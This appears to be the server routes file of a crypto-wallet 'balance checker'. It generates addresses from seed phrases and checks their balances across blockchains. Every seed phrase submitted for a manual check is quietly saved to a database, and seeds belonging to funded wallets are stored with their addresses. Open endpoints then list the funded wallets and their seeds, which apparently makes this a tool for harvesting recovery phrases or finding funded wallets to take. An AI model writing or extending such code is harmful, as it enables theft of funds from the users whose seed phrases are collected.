import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import * as addressGenerator from "./blockchain/address-generator";
import { getCachedBalance, setCachedBalance } from "./blockchain/api";
import { checkBalanceWithSmartRotation as checkBalance } from "./blockchain/api-smart-rotation";
import { BlockchainType, blockchainSchema, seedPhraseSchema, wallets, BalanceCheckResult, WalletAddress } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Generate addresses from seed phrase
  app.post("/api/generate-addresses", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
        blockchains: z.array(blockchainSchema),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { seedPhrase, blockchains } = validationResult.data;

      // Generate addresses
      const addresses = await addressGenerator.generateAddressesFromSeedPhrase(
        seedPhrase,
        blockchains
      );

      return res.json({ addresses });
    } catch (error) {
      console.error("Error generating addresses:", error);
      return res.status(500).json({
        message: "Failed to generate addresses",
        error: String(error),
      });
    }
  });

  // Check balances for addresses
  app.post("/api/check-balances", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        addresses: z.array(
          z.object({
            blockchain: blockchainSchema,
            address: z.string(),
          })
        ),
        seedPhrase: z.string().optional(),
        isManualCheck: z.boolean().optional().default(false), // Thêm flag để phân biệt
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { addresses, seedPhrase, isManualCheck } = validationResult.data;
      const results: BalanceCheckResult[] = [];

      // Check balances for all addresses
      for (const addressData of addresses) {
        const { blockchain, address } = addressData;

        try {
          // Check if we already have a cached balance
          const cachedBalance = getCachedBalance(blockchain, address);
          
          let balance;
          if (cachedBalance !== null) {
            balance = cachedBalance;
          } else {
            // Check balance from APIs
            balance = await checkBalance(blockchain, address);
            // Cache the result
            setCachedBalance(blockchain, address, balance);
          }

          const hasBalance = parseFloat(balance) > 0;
          results.push({
            address,
            balance,
            hasBalance,
            blockchain
          });

          // If balance > 0 and we have a seed phrase, save to database
          if (hasBalance && seedPhrase) {
            try {
              await storage.createWallet({
                blockchain,
                address,
                balance,
                seedPhrase,
                path: "",
                source: isManualCheck ? "manual" : "auto", // Thêm source để phân biệt
                metadata: {
                  timestamp: new Date().toISOString(),
                  isManualCheck
                },
              });
            } catch (dbError) {
              console.error("Error saving wallet to database:", dbError);
              // Continue even if DB save fails
            }
          }
          
          // Nếu là kiểm tra thủ công, lưu seed phrase vào bảng manual_checks
          if (isManualCheck && seedPhrase) {
            try {
              await storage.createManualCheck({
                seedPhrase,
                timestamp: new Date(),
                metadata: { 
                  addressChecked: address,
                  blockchain,
                  balance,
                  hasBalance
                },
              });
            } catch (dbError) {
              console.error("Error saving manual check:", dbError);
              // Continue even if DB save fails
            }
          }
        } catch (error) {
          console.error(`Error checking balance for ${blockchain} address ${address}:`, error);
          results.push({
            address,
            balance: "0",
            hasBalance: false,
            blockchain
          });
        }
      }

      return res.json({ results });
    } catch (error) {
      console.error("Error checking balances:", error);
      return res.status(500).json({
        message: "Failed to check balances",
        error: String(error),
      });
    }
  });

  // API riêng để lưu seed phrase từ kiểm tra thủ công
  app.post("/api/save-manual-check", async (req: Request, res: Response) => {
    try {
      // Validate request
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
        metadata: z.record(z.any()).optional(),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { seedPhrase, metadata = {} } = validationResult.data;

      // Lưu vào bảng manual_checks
      await storage.createManualCheck({
        seedPhrase,
        timestamp: new Date(),
        metadata,
      });

      return res.json({ success: true });
    } catch (error) {
      console.error("Error saving manual check:", error);
      return res.status(500).json({
        message: "Failed to save manual check",
        error: String(error),
      });
    }
  });

  // Get wallets with balance
  app.get("/api/wallets-with-balance", async (req: Request, res: Response) => {
    try {
      const walletsWithBalance = await storage.getWalletsWithBalance();
      return res.json({ wallets: walletsWithBalance });
    } catch (error) {
      console.error("Error fetching wallets:", error);
      return res.status(500).json({
        message: "Failed to fetch wallets",
        error: String(error),
      });
    }
  });
  
  // Get wallets by source (manual or auto)
  app.get("/api/wallets-by-source/:source", async (req: Request, res: Response) => {
    try {
      const { source } = req.params;
      if (source !== 'manual' && source !== 'auto') {
        return res.status(400).json({
          message: "Invalid source, must be 'manual' or 'auto'",
        });
      }
      
      const wallets = await storage.getWalletsBySource(source);
      return res.json({ wallets });
    } catch (error) {
      console.error(`Error fetching wallets by source '${req.params.source}':`, error);
      return res.status(500).json({
        message: "Failed to fetch wallets",
        error: String(error),
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
